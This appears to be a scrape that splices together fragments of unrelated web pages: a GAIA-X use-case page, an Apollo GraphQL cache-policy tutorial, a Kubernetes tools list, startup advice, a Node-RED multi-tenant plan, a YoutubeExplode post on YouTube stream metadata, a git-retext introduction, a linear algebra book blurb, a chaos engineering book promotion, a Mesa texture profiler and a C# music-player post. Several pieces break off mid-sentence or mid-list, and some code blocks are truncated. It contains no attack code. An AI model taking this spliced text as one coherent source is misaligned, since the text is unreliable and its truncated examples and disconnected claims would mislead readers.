welcome. Of course, use cases can also be developed and implemented outside the GAIA-X working structure.</p> </div> </div> </div> </div> <div id="id1854484" tabindex="-1"> <div> <div> <p> <span>Use Case Gallery</span> </p> <h2> GAIA-X Use Cases </h2> </div>  </div>  </div> <div id="id1838600"> <div id="accoID1838600"> <div>   <div id="collapse1838768"> <div> <div>   <div id="id1838786">  <ul data-slider-items="3|2|1"> <li> <div> <figure> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=480w" title="Icon Shared Production: werk- und firmenübergreifende Produktion als Showcase bzw.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><div><div itemprop="text"><p>Apollo InMemoryCache type policies are used to define <a target="_blank" href="https://www.apollographql.com/docs/react/local-state/managing-state-with-field-policies/#defining">field policies for local state</a>, to <a target="_blank" href="https://www.apollographql.com/docs/react/caching/cache-configuration/#customizing-identifier-generation-by-type">customize identifier generation by type</a> or to <a target="_blank" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/#merging-arrays">define a custom merge function for the cache</a>.</p>
<p>The standard way of doing this is by defining the type policies during initialization of apollo client like this:</p>
<pre><code><span>const</span> apolloClient = <span>new</span> ApolloClient({
    ...
    cache: <span>new</span> InMemoryCache({
        <span>typePolicies</span>: {
            
            <span>Article</span>: {
             
                <span>fields</span>: {
                    
                    <span>isBookmarked</span>: {
                        
                        read(_, { variables }) {
                            <span>return</span> <span>localStorage</span>
                              .getItem(<span>'BOOKMARKS'</span>)
                              .includes(
                                 variables.articleId
                              );
                        }
                    }
                }
            },

            
            <span>Book</span>: {
                <span>keyFields</span>: [<span>"isbn"</span>],
            }


            
            <span>SearchResults</span>: {
                <span>fields</span>: {
                    <span>results</span>: {
                        merge(existing = [], <span>incoming</span>: any[]) {
                            <span>return</span> [...existing, ...incoming];
                        },
                    }
                }
            }
        },
    });
})
</code></pre>
<p>This might not always be possible. You might want to do this at runtime instead. Some of these scenarios:</p>
<ol>
<li>If you are loading different chunks at runtime based on user interaction</li>
<li>You have a microfrontends architecture (like in our case).</li>
</ol>
<p>To do this you can follow these steps:</p>
<h3 id="1-get-an-instance-of-the-cache">1. Get an instance of the cache</h3>
<pre><code><span>const</span> { loading, error, data, client } = useQuery(QUERY);

<span>const</span> cache = client.cache
</code></pre>
<h3 id="2-add-policies-to-the-cache">2. Add policies to the cache</h3>
<p>To specify key fields for custom identifier generation</p>
<pre><code>cache.policies.addTypePolicies({
    
    <span>Book</span>: {
        <span>keyFields</span>: [<span>"isbn"</span>],
    }
})
</code></pre>
<p>Or to define field policy for local storage</p>
<pre><code>cache.policies.addTypePolicies({
    <span>Article</span>: {
        <span>fields</span>: { 
            <span>isBookmarked</span>: { 
                read(_, { variables }) { 
                    <span>return</span> <span>localStorage</span>
                      .getItem(<span>'BOOKMARKS'</span>)
                      .includes(
                        variables.articleId
                      );
                }
            }
        }
    },
})
</code></pre>
<h2 id="caveat">Caveat</h2>
<p>The reason why it is recommended to configure these at build time is because that way apollo can ensure that the data is not accessed before the type policies are defined.
If you want to do this at runtime, you need to make sure that you call <code>addTypePolicies</code> before you call <code>useQuery</code> with the query that uses the type whose policy you are modifying</p>

<h2><a id="1"></a>Introduction</h2>



<p>In the last few years, Kubernetes has laid waste to its fellow competitors in the battlefield of container orchestration. Sadly, Docker Swarm hasn’t been a major contender since 2016 and, like AWS, admitted defeat by pledging K8s support and integration.</p>



<p><span>Since Kubernetes has skyrocketed to popularity as the container solution of choice, here’s a comprehensive list of all the tools that complement K8s to further enhance your development work.</span></p>

<p><span>Cost: Free</span></p>



<h3><b>3. Kubeadm</b></h3>



<p><span>Kubeadm is a Kubernetes distribution tool since version 1.4. The tool helps to bootstrap best-practice Kubernetes clusters on existing infrastructure. Kubeadm cannot provision infrastructure for you though. Its main advantage is the ability to launch minimum viable Kubernetes clusters anywhere. Add-ons and networking setup are both out of Kubeadm’s scope though, so you will need to install this manually or using another tool.</span></p>

<p><span>Cost: Free</span></p>



<h3><b>4. Kops</b></h3>



<p><span>Kops helps you create, destroy, upgrade, and maintain production-grade, highly available Kubernetes clusters from the command line. Amazon Web Services (AWS) is currently officially supported, with GCE in beta support, and VMware vSphere in alpha, and other platform support is planned. Kops allows you to control the full Kubernetes cluster lifecycle; from infrastructure provisioning to cluster deletion.</span></p>

Becoming a millionaire was not discussed, nor even imagined. Yet, here we are.</p><p id="acdf">Here are a few things I’ve learned from a decade of trying to make it on the internet.</p><h2 id="a6d0">Bet on yourself, but make sure it’s actually a bet</h2><p id="bcf1">The low point of (one of) my first companies was being so desperate for revenue that we adapted our<em> virtual job fair</em> platform to become a virtual business directory for a small town. For $2000/yr.</p><p id="6385">There is no upside to that. We essentially became a horribly paid consultant for an industry we didn’t care about with a product that didn’t add any value.</p><p id="f2cc">Limping along for years while eating ramen and pitching a VISION isn’t success — you’ll be much worse off than if you had just worked for a startup for a few years to improve your skills and peers.</p><p id="ce0b">To truly bet on yourself while starting a company, everything you do should accelerate any of the following:</p><ul><li id="bc69">Learning new skills: sales, product management, product development, engineering, marketing, design, fundraising</li><li id="12a6">Meeting great people — not in the “I shook Mark Cuban’s hand” sense, but in the “I have 5 equally motivated people in my corner building shit that I can text about the fact that we won’t make payroll next month.”</li><li id="c5c2">Making money on your own time</li><li id="00e0">Travelling or experiencing the world through a different lens (though in 2020 you should just get a remote job)</li></ul><h2 id="e853">Build your tribe</h2><p id="ae33">You don’t need mentors. You don’t need investors. You need 5 friends with similar ambitions trying to figure this shit out with you.</p><p id="537b">You want people that you can call when your world is falling apart. When you want to quit. When you hate your co-founders. When you’re questioning everything. When you’ve made the money, but don’t feel good about it.</p><p id="8018">It is a weird, un-relatable world that we’re playing in. To navigate it, you need people that understand. I’m so lucky I found my people.</p><p id="1451">I don’t have great advice on how to find your people.</p><p id="c46f">Join a co-working space? Get into a startup accelerator? Join a program like <a href="https://www.beondeck.com/" rel="noopener">On Deck</a>? Message people on Twitter?</p><h2 id="ba6f">Just launch something</h2><p id="64cd">I know many people who are much more talented than I. They’ve got better ideas, more technical skills, and are just plain smarter.</p><p id="1d7d">What they don’t have is that forcing function that compels me to launch stuff.</p><p id="7bb3">The shamelessness. The not-give-a-fuckery.</p><p id="2ae5">To not quit when I want to quit. I’m not sure that “chip on the shoulder” is all positive, but it’s probably necessary.</p><p id="aaf9">It’s a learned behaviour. I don’t come by it naturally. I hate failing. I suck at getting feedback. I’m overly sensitive. And yet, here we are.</p><h2 id="e2b4">It takes 3 years for anything to work</h2><p id="cccf">Every successful company I’ve seen has taken at least 3 years to get some hint of product market fit.</p><p id="1a79">Dig deeper into every company that takes off overnight — it’s probably a pivot from something else, the founder’s 8th attempt, or a hail mary. The one thing that truly worked for me was about 3.5 years in.</p><p id="8fb0">That specific thing worked in month 2, but it took 3.5 years of learning to get to that point.</p><h2 id="43a7">Check your ambitions</h2><p id="2606">My original goal when starting out (Thanks Tim Ferriss!) was to <em>“build a business making 10k a month so I could work from anywhere.”</em></p><p id="b9da">I got there, and enjoyed it — lived in multiple countries, didn’t work too much, drank great wine and ate incredible steak. It wasn’t enough.</p><p id="9d82">Financially, it didn’t matter. The cash was enough, but a life of leisure isn’t a great goal for a 30 year old.

	<div>
		
<p>I was recently approached by a company that wanted to sponsor adding Multi Tenant support to Node-RED. This would be to enable multiple users to run independent flows on a single Node-RED instance.</p>



<p>This is really not a good idea for a number of reasons. But mainly it is because the NodeJS runtime is inherently single threaded and there is no way to get real separation between different users. For example, if one user uses a poorly written node (or function in a function node) it is possible to block the event loop starving out all the other users or in extreme cases an uncaught asynchronous exception will cause the whole application to exit.</p>



<p>The best approach is to run a separate instance of Node-RED per user, which gives you the required separation between users. The usual way to do this is to use a container based system and a HTTP reverse proxy to control access to the instances.</p>



<p>Over the next months worth of posts I’ll outline the components required to build a system like I described and at the end should hopefully have a fully working Proof of Concept that people can use as the base to build their own deployments.</p>



<p>As the future posts are published I will add links here.</p>



<h2>Required components</h2>



<h3>Flow Storage</h3>



<p>Because containers file systems are not persistent we are going to need somewhere to reliably store the flows each user creates.</p>



<p>Node-RED supplies an <a href="https://nodered.org/docs/api/storage/">API</a> that lets you control how/where flows (and a bunch of things that would normally end up on disk)</p>



<figure></figure>



<h3>Authentication</h3>



<p>We are going to need a way to only allow right users access to the Node-RED editor, again there is a plugin <a href="https://nodered.org/docs/user-guide/runtime/securing-node-red#custom-user-authentication">API</a> that allows this to be wired into nearly any existing authentication source of your choice.</p>



<p>I wrote a simple implementation of this API which uses <a href="https://www.hardill.me.uk/wordpress/2015/05/11/securing-node-red/" data-type="post" data-id="2075">LDAP</a> as the source of users not long after Node-RED was released . But in this series of post I’ll write a new one that uses the same backend database as the flow storage plugin.</p>



<figure></figure>



<h3>Custom Container</h3>



<p>Once we’ve built storage and authentication plugins we will need to build a custom version of the Node-RED Docker container that includes these extras.</p>



<figure></figure>



<h3>HTTP Reverse Proxy</h3>



<p>Now we have a collection of containers each running a users instance of Node-RED we are going to need a way to expose these to the outside world. Since Node-RED is a web application then a HTTP Reverse Proxy is probably the right way forward. </p>



<figure></figure>



<h3>Management</h3>



<p>Once all of the other pieces are in place we need is a way to control the creation/deletion of Node-RED instances. It will also be useful to see the instances’ logs.</p>



<figure></figure>



<h3>Extra bits</h3>



<p>Finally I’ll cover some extra bits that help make a deployment specific to a particular environment, such as</p>



<h4>Custom node repository</h4>



<p>This allows you to host your own private nodes and still install them using the Manage Palette menu.</p>



<h4>Custom Theme </h4>



<p>Tweaking page titles and colour schemes can make Node-RED fit in better with your existing look and feel.</p>



<figure></figure>



<h2>Working Example</h2>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>
<div data-language="ini"><pre><code><span>status</span><span><span>=</span>ok</span>

<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>
<span>s</span><span><span>=</span>9599599594B0133328AA570AE0129E58478D7BCE9D226F.15ABC404267945A3F64FB4E42074383FC4FA80F5</span>
<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>
<span>lmt</span><span><span>=</span>1507180885248732</span>

<span>init</span><span><span>=</span>0-708</span></code></pre></div>
<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>
<p>The DASH manifest follows <a href="http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd">this XML schema</a>. You can parse the stream metadata if you go through all descendant nodes of type <code>Representation</code>. Here’s how they appear:</p>
<div data-language="xml"><pre><code><span><span><span>&lt;</span>Representation</span> <span>id</span><span><span>=</span><span>"</span>133<span>"</span></span> <span>codecs</span><span><span>=</span><span>"</span>avc1.4d4015<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>426<span>"</span></span>

<article>
    
    

    <div>
      <p>This is the second post in a series to expand on various utilities I wrote to
assist my work with Git.  Some of these utilities are located in a repository
on Github called <a href="https://github.com/da-x/misc-gitology">misc-gitology</a>.</p>
<p>Previous post: <a href="https://blog.aloni.org/posts/gitology-1-git-flip-history">#1</a>.</p>
<p>Today I'll introduce the commit rewriter - <code>git-retext</code>.</p>
<h2 id="familiar-ways-of-git-history-editing">Familiar ways of Git history editing</h2>
<p>In the previous post I mentioned the desire to present a clear Git history to
reviewers. Sometimes, we are reviewing our own unpublished Git history and
would like to do some polishing here and there before pushing it to a
remote repository.</p>
<p>There are multitude of ways in which editing the history can be done:</p>
<ul>
<li><code>git commit --amend</code>, with or without <code>-a</code> (in the later <code>git add</code> is used). This
takes care of the <code>HEAD</code> commit, but not commits that are earlier to it.</li>
<li><code>git rebase</code>, where you labor on a fixup commit or a set of them,
with or without <code>--interactive</code>, with or without <code>--autosquash</code>, so that
the fixup changes amend commits further down the history. There are tools such
as <a href="https://github.com/tummychow/git-absorb">git-absorb</a> that can be used to
automate creation of fixup commits.</li>
<li><code>git-filter-branch</code>, a big hammer that lets you run a command per a commit,
where the result of a command is the rewritten tree. Obviously not
quite suitable for easy 'final touches'.</li>
<li>Editor environment features. In Emacs, <a href="https://magit.vc/">Magit</a>, and in
Vim, <a href="https://github.com/jreybert/vimagit">Vimagit</a>, and possibly other editors
have their own Git integrations, some are elaborate enough to ease on editing
the history. However, to each his own, and belaboring on a certain editor
environment would get us off-topic.</li>
</ul>
<h2 id="a-new-way-git-retext">A new way - <code>git-retext</code></h2>
<p>In the process of reviewing, we are most likely looking at diffs. What if it
was possible in an environment-independent way, to just edit the diff? </p>
<p>In the pre-cursor to the invention of Git, developers used emails (and some are
still using emails) in order to pass along changes to one another. The <code>git format-patch</code> command knows how to turn a list of commits into such emails. As
plain text emails can be easily edited by a text editor, it stands to reason
that we can edit changes in-place, if we momentarily turn commits into emails
and back.</p>
<p>This is what <code>git-retext</code> essentially lets you do.</p>
<p>For example, we want to edit the most recent commit in the history. Let's issue
the command:</p>

<p>This <code>git-retext</code> command turns the <code>HEAD~1..HEAD</code> range into emails and we
immediately find ourselves thrown into editing in the default text editor that
we configured, either in Git's configuration, or <code>EDITOR</code> environment variable.
The "thrown into editor" situation should not be foreign to Git users, as it is
done in the default <code>git commit</code> or <code>git rebase -i</code> workflows.</p>
<p>Here's an example for such <code>git-retext HEAD~1</code> invocation at one of my
repositories:</p>

Subject: [PATCH] Apply random rotation for new piece

By applying a random set of rotation, the new piece is effectively
rotated to all possible rotations.

<p>This is how a commit looks like when it is sent by email. It is possible to
edit the first line of the commit in the <code>Subject: </code> ; and the details of the
commit message before the <code>---</code>, and the diff itself. About the diff, we don't
have to fix the unidiff's meta-data, because <code>git-retext</code>'s processing will
take care of it instead.</p>
<p>Saving the temporary and exiting, <code>git-retext</code> will try to apply the edited
commits using <code>git am</code>. If we have carefully edited them, they should
apply cleanly. The resultant <code>HEAD</code> is the edited history.</p>
<p>Of course, this new method is not perfect, but it's a time saver for certain
set of editing activities. After getting accustomed to it, you may start
reviewing changes in <code>git-retext</code> even if you are not ending up modifying them,
instead of running <code>git-diff</code> or viewing a diff made by the editor environment.</p>
<h2 id="advantages">Advantages</h2>
<ul>
<li>Easy to amend changes right when they are being reviewed, as long as
the editing is not too complicated. Adding new diff lines inside hunks
is possible.</li>
<li>Easy to do search and replace on the changes themselves, and that also takes
care of the commit message, and added filenames if relevant.</li>
<li>It is possible to remove unwanted diff hunks.</li>
<li>Splitting of commits to small new commits is possible by adding a new email
header in between hunks (no need to edit the diffstat).</li>
</ul>
<h2 id="disadvantages">Disadvantages</h2>
<ul>
<li>If there is more than one commit and they are dependent on one another, we
must be more careful so that the editing is consistent, and that the diff hunk
context is correct.</li>
<li>It's easy to mess up the editing and discover the mess only when <code>git-retext</code>
fails to apply the changes.</li>
</ul>
<p>Future enhancements of <code>git-retext</code> should assist in avoiding mistakes during
editing, perhaps with better editor integration.</p>

<p><code>git-retext</code> is Python 3 script that relies on <code>recountdiff</code> in order to fix
the edited diffs. The underlying git commands being used are
<code>git-format-patch</code>, <code>git-am</code>, and <code>git-reset</code>.</p>

	  <a href="http://joshua.smcvt.edu/linearalgebra/book.pdf"><i>Linear Algebra</i></a> by Jim Hefferon,
	  along with its 
	  <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">answers to exercises</a>, 
	  is a text for a first undergraduate course.
	  It is Free.
	  Use it as the main book, as a supplement, or for independent study.
	</p>

	<h3>
	  Highlights
	</h3>
	
	<ul>
	  <li><span>Standard coverage</span>
            Linear systems and Gauss's method, 
	    vector spaces, linear maps and matrices, determinants,
	    and eigenvectors and eigenvalues.
          </li>
	  
	  <li><span>Developmental approach</span>
	    The book proves all of the results
	    but does not start by assuming that 
	    students are already able at abstract work.
	    Instead, it proceeds with a great deal of
	    motivation, many computational examples, 
            and many exercises.
	    The goal is to raise 
            each student's level of 
	    mathematical maturity.
          </li>
	  
	  <li><span>Extensive exercise sets</span>   
            Each subsection has a wide range of exercises,
            from 
	    routine verifications to a few challenges.
	    The
	    <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">solution book</a>
	    has each answer completely worked.
	    In addition, clicking on a problem 
	    takes you to its answer
	    while clicking on the answer takes you back to the problem.
          </li>
	  
	  <li><span>Popular</span>
	    Used in hundreds of classes at many schools, 
            as well as by thousands of people
            for independent study.
          </li>
	  
	  <li><span>Applications</span>
            Each chapter finishes with four or five short  
	    supplemental topics
            for reading or projects, or for
            small group work. 
          </li>

<p>I was hired at Netflix to lead the Traffic Team in early 2015. A few weeks later I was also asked to charter a Chaos Engineering Team. At the time, Chaos Engineering was essentially a program called Chaos Monkey with a few supporting blog posts. I wanted to get a feel for what our engineers thought about the practice, so I asked around: “What is Chaos Engineering?” The response I usually heard was, “Oh, that’s when we break stuff in production.”</p>



<p>As cool as that sounds, I could break stuff in production all day long and not provide any value to Netflix. I wanted to keep my job, not cause pointless havoc. So instead, I sat down with my team and defined Chaos Engineering as a proactive discipline to improve availability. We borrowed heavily from the field of Resilience Engineering and other research outside of the software industry to frame a practice of experimentation that follows in the best traditions of western science. Our definition is still published at <a href="http://principlesofchaos.org/" target="_blank" rel="noreferrer noopener">http://principlesofchaos.org/</a>. The point of Chaos Engineering isn’t to create chaos; it’s to chart a path of confidence through the chaos.</p>



<p>Working at Netflix was a highlight of my journey with Chaos Engineering. Another is co-authoring and publishing “Chaos Engineering: System Resiliency in Practice” with Nora Jones (Jeli.io). And now I am thrilled to have the opportunity to give away free e-copies of my book.</p>



<h2>Why Chaos Engineering is So Important Now</h2>



<p>Remote communication is literally saving lives during the pandemic. Never before have so many people relied on digital infrastructure to perform even basic tasks like getting food. The massive migration to remote work and remote education has irrevocably changed the course of societal structures, norms, and communication.</p>



<p>Work and school for hundreds of millions of people moved online in a matter of weeks. This is a monumental change to the most complex sociotechnical system we will ever be a part of. We don’t have access to a control group in this experiment. We only have one shot to get this right. The stakes are high.</p>



<p>With high stakes comes the opportunity for high value. The safety and reliability of the digital systems that we are suddenly so dependent on has never been more obvious. We have the opportunity and the responsibility to innovate in the areas of availability and security, to make these systems better in ways that matter to people.</p>



<p>The old methods won’t cut it. They aren’t bad, but they aren’t sufficient. Incident response management, alerting, metrics/logging, disaster recovery—all great, but also all reactive. They focus on time-to-detect and time-to-remediate. We need proactive methods. TDD, pair programming, peer code reviews, syntax scanning, QA—also great, but they won’t move the needle on availability or security in a complex system. You can’t expect a human to provide safety guarantees on something (a complex distributed system) that by definition is beyond the capability of a human to mentally model.</p>



<p>Chaos Engineering is a proactive approach to improving the safety properties of complex systems. We have an imperative to lean into these new, innovative approaches to help us cope with the increasing complexity and stress that our organizations are in. If you feel like your organization is facing unprecedented demands and requirements from a reliability perspective, you are in good company: most of us operating systems at scale are in that same position. With Chaos Engineering, you have an opportunity to meet those demands and navigate that complexity.</p>



<h2><strong>In the Book</strong></h2>



<p>This book explains where Chaos Engineering came from and provides some mental models to challenge the current mainstream thinking on system reliability. We then provide chapters contributed by authors from Slack, Google, Microsoft, LinkedIn, and CapitalOne, so that you can hear in their own words how people responsible for critical systems at scale are embracing Chaos Engineering to meet the challenges of the day. We also explore a bit outside of the typical boundaries of distributed software engineering to take a look at the future of the practice as well as its impact in manufacturing, autonomous vehicles, human systems, cyber security, and Continuous Verification.</p>



<h2><strong>We Want You to Have the Book… for Free</strong></h2>



<p>Nora and I wrote the most comprehensive, practical guide to Chaos Engineering. We even dedicated an entire chapter to establishing ROI so that you can see how Chaos Engineering has a positive effect. </p>



<p>Now Verica is sponsoring this book so that we can send you a digital copy for free.

								“A new practice is emerging that builds on the advantages established by CI/CD.
								Continuous Verification (CV) often manifests as a stage in a pipeline, but it can
								also run independently during business hours, verifying assumptions about the
								behavior of a system. Much like Chaos Engineering, CV platforms can include
								Availability or Security components and often express these as hypotheses. Like
								CI/CD, the practice is born out of a need to navigate increasingly complex systems.
								Organizations do not have the time or other resources to validate that the internal
								machinations of the system work as intended, so instead they verify that the output
								of the system is inline with expectations. This is the preference for verification
								over validation that hallmarks successful management of complex systems.”
							</p>
						</div>
						<p>
							There are many properties of a complex system that cannot be designed in the traditional
							sense, but that a business still needs to optimize. Take availability as an example.
							There are many approaches to improving availability. Some examples include: Incident
							Management, Alerting, Service Degradation, Observability Instrumentation, Disaster
							Recovery, Postmortem Facilitation, etc. What all of these approaches have in common is
							that they are aimed at improving time to detection (TTD) and time to remediation (TTR)
							of an incident. They are all reactive.
						</p>
						<p>
							When we sat down to define Chaos Engineering, we set out to build a discipline that was
							proactive. Chaos Engineering draws from the rich history of empirical experimentation to
							proactively discover vulnerabilities in complex systems. The culmination of this was the
							Chaos Automation Platform (ChAP) built by my team at Netflix.

      <p>
	One of the big determinants of OpenGL performance is texture
	usage; if an application starts using more textures than fit
	into the graphics card memory, performance can drop
	dramatically.
      </p>
      <p>
	texturetop is something I cooked up to allow easily getting a
	view of the texture usage of a client using the open-source
	Mesa/DRI implementation of libGL. It consists of two pieces;
	a patch for Mesa that provides a generic texture profiling
	hook and a small text mode client along the lines of the
	classic 'top' that uses the profiling hook.
      </p>
      <p>
	The way that the texture profiling hook works is that if an
	environment variable LIBGL_PROFILE_SERVER is set, a separate
	thread is created that connects to the specified profiling
	server and waits for commands for the server. The only command
	at the current time (other than startup/shutdown) is a request
	for changes to the current state since the last update.
      </p>
      <p>
	Some small driver modifications are needed to hook up to this
	profiling infrastructure. In the current version of the patch,
	only the Savage driver is modified, so it probably won't
	do anything for your video card without a little work.
      </p>
      <p>
	The information that texturetop displays is:
      </p>
      <ul>
	<li>Number and size of available texture heaps (Card, AGP,
	etc.)</li>
	<li>For each texture
	  <ul>
	    <li>Width and height of the texture</li>
	    <li>Bytes used in main client memory</li>
	    <li>Current heap for the texture, if any</li>
	    <li>Time texture has been in that heap</li>
	    <li>Bytes used in that heap</li>
	  </ul>
	</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

